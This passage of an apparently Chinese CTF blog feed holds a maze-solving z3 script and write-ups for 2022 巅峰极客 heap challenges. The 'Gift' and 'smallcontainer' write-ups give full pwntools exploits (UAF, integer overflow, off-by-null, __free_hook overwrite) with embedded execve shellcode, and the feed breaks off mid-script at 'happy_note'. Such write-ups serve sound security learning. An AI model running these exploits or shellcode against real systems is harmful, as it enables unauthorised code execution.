class="number">0xEA</span>, <span class="number">0xF7</span>, <span class="number">0x51</span>, <span class="number">0x62</span>, <span class="number">0xD1</span>, <span class="number">0x3A</span>, <span class="number">0x67</span>, <span class="number">0x56</span>, <span class="number">0x66</span>, <span class="number">0xBA</span>,</span><br><span class="line">      <span class="number">0x79</span>, <span class="number">0x59</span>, <span class="number">0x66</span>, <span class="number">0xB1</span>, <span class="number">0xC5</span>, <span class="number">0x8F</span>, <span class="number">0xE9</span>, <span class="number">0x6C</span>, <span class="number">0x99</span>, <span class="number">0x3C</span>, <span class="number">0xF0</span>, <span class="number">0x89</span>, <span class="number">0xF6</span>, <span class="number">0xBF</span>, <span class="number">0x15</span>, <span class="number">0x61</span>, <span class="number">0x92</span>, <span class="number">0xE0</span>,</span><br><span class="line">      <span class="number">0x60</span>, <span class="number">0x3E</span>, <span class="number">0x59</span>, <span class="number">0x35</span>, <span class="number">0x4B</span>, <span class="number">0x1F</span>, <span class="number">0x6F</span>, <span class="number">0x65</span>, <span class="number">0xE4</span>, <span class="number">0x71</span>, <span class="number">0x0D</span>, <span class="number">0x7B</span>, <span class="number">0x6E</span>, <span class="number">0x93</span>, <span class="number">0x14</span>, <span class="number">0x5D</span>, <span class="number">0x4C</span>, <span class="number">0x6F</span>,</span><br><span class="line">      <span class="number">0x2F</span>, <span class="number">0x52</span>, <span class="number">0xA6</span>, <span class="number">0x5D</span>, <span class="number">0x90</span>, <span class="number">0x7B</span>, <span class="number">0xCC</span>, <span class="number">0xE1</span>, <span class="number">0x69</span>, <span class="number">0x77</span>, <span class="number">0x7E</span>, <span class="number">0x8D</span>, <span class="number">0x33</span>, <span class="number">0x6B</span>, <span class="number">0x37</span>, <span class="number">0xC4</span>, <span class="number">0x2F</span>, <span class="number">0xBF</span>,</span><br><span class="line">      <span class="number">0x6F</span>, <span class="number">0xBF</span>, <span class="number">0xA8</span>, <span class="number">0xB3</span>, <span class="number">0x61</span>, <span class="number">0x5C</span>, <span class="number">0xD2</span>, <span class="number">0xC2</span>, <span class="number">0x2D</span>, <span class="number">0xC8</span>, <span class="number">0xF4</span>, <span class="number">0xBB</span>, <span class="number">0xB2</span>, <span class="number">0xD0</span>, <span class="number">0x22</span>, <span class="number">0x9C</span>, <span class="number">0x75</span>, <span class="number">0xDF</span>,</span><br><span class="line">      <span class="number">0x59</span>, <span class="number">0x72</span>, <span class="number">0xAA</span>, <span class="number">0xFD</span>, <span class="number">0x7E</span>, <span class="number">0x67</span>, <span class="number">0x2E</span>, <span class="number">0x61</span>, <span class="number">0xBA</span>, <span class="number">0x6B</span>, <span class="number">0x4B</span>, <span class="number">0x19</span>, <span class="number">0xA6</span>, <span class="number">0xD5</span>, <span class="number">0x11</span>, <span class="number">0x15</span>, <span class="number">0xBC</span>, <span class="number">0x91</span>,</span><br><span class="line">      <span class="number">0xEB</span>, <span class="number">0x42</span>, <span class="number">0xCC</span>, <span class="number">0x72</span>, <span class="number">0xB2</span>, <span class="number">0xC6</span>, <span class="number">0x47</span>, <span class="number">0xA3</span>, <span class="number">0xCC</span>, <span class="number">0xAC</span>, <span class="number">0x6C</span>, <span class="number">0xA8</span>, <span class="number">0xD8</span>, <span class="number">0xCA</span>, <span class="number">0xD2</span>, <span class="number">0x84</span>, <span class="number">0x2B</span>, <span class="number">0x35</span>,</span><br><span class="line">      <span class="number">0xAB</span>, <span class="number">0xAF</span>, <span class="number">0xC8</span>, <span class="number">0xA5</span>, <span class="number">0x2F</span>, <span class="number">0x7F</span>, <span class="number">0x7F</span>, <span class="number">0xF5</span>, <span class="number">0x21</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line"></span><br><span class="line">rs = [[<span class="number">0</span>] * <span class="number">21</span>] * <span class="number">21</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">21</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">21</span>):</span><br><span class="line">        rs[y][x] = (y ^ (x &lt;&lt; <span class="number">8</span>) ^ s1[y * <span class="number">21</span> + x] ^ s2[y * <span class="number">21</span> + x])</span><br><span class="line">    <span class="built_in">print</span>(rs[y])</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>生成后的迷宫：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]</span><br><span class="line">[1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0]</span><br><span class="line">[1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0]</span><br><span class="line">[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0]</span><br><span class="line">[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 0]</span><br><span class="line">[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0]</span><br><span class="line">[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0]</span><br><span class="line">[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0]</span><br><span class="line">[1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0]</span><br><span class="line">[1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0]</span><br><span class="line">[1, 1, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0]</span><br><span class="line">[0, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0]</span><br><span class="line">[0, 1, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0]</span><br><span class="line">[0, 0, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0]</span><br><span class="line">[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0]</span><br><span class="line">[1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0]</span><br><span class="line">[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0]</span><br><span class="line">[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 0]</span><br><span class="line">[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0]</span><br><span class="line">[0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0]</span><br><span class="line">[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1]</span><br></pre></td></tr></table></figure>

<p>寻找迷宫出口的脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = BitVec(<span class="string">&#x27;a&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add((((a &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>) ^ (<span class="number">16777619</span> * (((a &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>) ^ (</span><br><span class="line">        <span class="number">16777619</span> * (((a &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>) ^ (<span class="number">16777619</span> * ((a &amp; <span class="number">0xff</span>) ^ <span class="number">0x50C5D1F</span>))))))) == <span class="number">0x618FF339</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    <span class="built_in">print</span>(s.model())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;fail&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以发现迷宫的出口是<code>(20, 20)</code>，网上找一个迷宫求解的脚本跑一跑就可以出来了。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>长城杯</tag>
      </tags>
  </entry>
  <entry>
    <title>2022 巅峰极客</title>
    <url>/2022/08/23/CTF/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/</url>
    <content><![CDATA[<h2 id="Gift"><a href="#Gift" class="headerlink" title="Gift"></a>Gift</h2><p>流程不复杂，在释放堆块时存在uaf的漏洞，在bargain的功能里存在一个整数溢出的漏洞（我们打折优惠的钱是一个有符号的整数）。所以基本的思路就是对已经释放的堆块进行bargain操作，这样就能使这个堆块指向我们构造的fake_chunk（控制size就可以被放入unsortedbin中），再次申请就可以拿到我们的fake_chunk，有了堆叠一切就都好处理了。</p>
<p>这道题听说没给libc，需要结合本地和远程一起调，推测是存在tcache的，否则我们构造的fake_chunk的size域和fastbin索引的大小不同会报错，自然也就泄露不了libc了。</p>
<span id="more"></span>

<p>WP如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line">sh_x86_18=<span class="string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x86_20=<span class="string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x64_21=<span class="string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f2a5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f302 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a2fc execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">choice, data</span>):</span><br><span class="line">    sla(<span class="string">&#x27;your choice:&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;your choice:&#x27;</span>, <span class="built_in">str</span>(choice))</span><br><span class="line">    sa(<span class="string">&#x27;plz write your wish on your gift!&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;your choice:&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;your choice:&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index?&#x27;</span>, <span class="built_in">str</span>(idx))    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bargain</span>(<span class="params">idx, cost</span>):</span><br><span class="line">    sla(<span class="string">&#x27;your choice:&#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index?&#x27;</span>, <span class="built_in">str</span>(idx))    </span><br><span class="line">    sla(<span class="string">&#x27;How much?&#x27;</span>, <span class="built_in">str</span>(cost))</span><br><span class="line"></span><br><span class="line">pld = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xc0</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x421</span>)</span><br><span class="line">add(<span class="number">1</span>, pld)   <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 3</span></span><br><span class="line">pld = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xa0</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">pld += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">add(<span class="number">1</span>, pld)   <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)   <span class="comment"># 1 -&gt; 0</span></span><br><span class="line">bargain(<span class="number">1</span>, -<span class="number">0xe0</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 6</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">ru(<span class="string">&#x27;cost: &#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(ru(<span class="string">&#x27;\ntype&#x27;</span>)[:-<span class="number">5</span>], <span class="number">10</span>) - <span class="number">0x3ebca0</span></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">ogg = libc_base + <span class="number">0x4f302</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">lg(<span class="string">&#x27;free_hook&#x27;</span>)</span><br><span class="line">lg(<span class="string">&#x27;ogg&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">pld = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x111</span>) + p64(free_hook - <span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">2</span>, pld)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">1</span>, p64(ogg))    <span class="comment"># 8</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="smallcontainer"><a href="#smallcontainer" class="headerlink" title="smallcontainer"></a>smallcontainer</h2><p>一道2.27的<code>off-by-null</code>的堆题，没什么困难的，注意一下填充tcache就可以。</p>
<p>WP如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./smallcontainer&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./smallcontainer&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line">sh_x86_18=<span class="string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x86_20=<span class="string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x64_21=<span class="string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f2a5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f302 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a2fc execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Input size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Input index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Input index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    s(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Input index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x208</span>)  <span class="comment"># 0 - 6</span></span><br><span class="line">add(<span class="number">0x208</span>)  <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x1d8</span>)  <span class="comment"># 8</span></span><br><span class="line">add(<span class="number">0x108</span>)  <span class="comment"># 9</span></span><br><span class="line">add(<span class="number">0x208</span>)  <span class="comment"># 10</span></span><br><span class="line">add(<span class="number">0x108</span>)  <span class="comment"># 11</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x1f8</span>)  <span class="comment"># 0 - 6</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">9</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x108</span>)</span><br><span class="line">edit(<span class="number">9</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x100</span> + p64(<span class="number">0x500</span>))</span><br><span class="line">edit(<span class="number">10</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x1f0</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xf21</span>))</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x148</span>)  <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x148</span>)  <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x148</span>)  <span class="comment"># 2</span></span><br><span class="line">show(<span class="number">9</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>((<span class="string">b&#x27;0x&#x27;</span> + r(<span class="number">12</span>)), <span class="number">16</span>) - <span class="number">0x3ebca0</span></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">ogg = libc_base + <span class="number">0x4f302</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">lg(<span class="string">&#x27;ogg&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">8</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x80</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x151</span>) + p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x148</span>)  <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x148</span>)  <span class="comment"># 2</span></span><br><span class="line">edit(<span class="number">2</span>, p64(ogg))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="happy-note"><a href="#happy-note" class="headerlink" title="happy_note"></a>happy_note</h2><p>一道2.34的堆题，存在一次uaf的free和两次malloc的机会，除此以外，是正常的释放堆块和calloc。这道题其实做法很多，可以用IO做，可以用banana做，也可以用environ做。</p>
<p>采用cat的方法，注意满足cat和FSOP的检查，尤其是不要忘了FSOP的检查：<code>fp-&gt;_mode &lt;= 0</code>和<code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>。这道题没开沙盒自然也就不需要控制rdx的值了。</p>
<p>WP如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./happy_note&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span 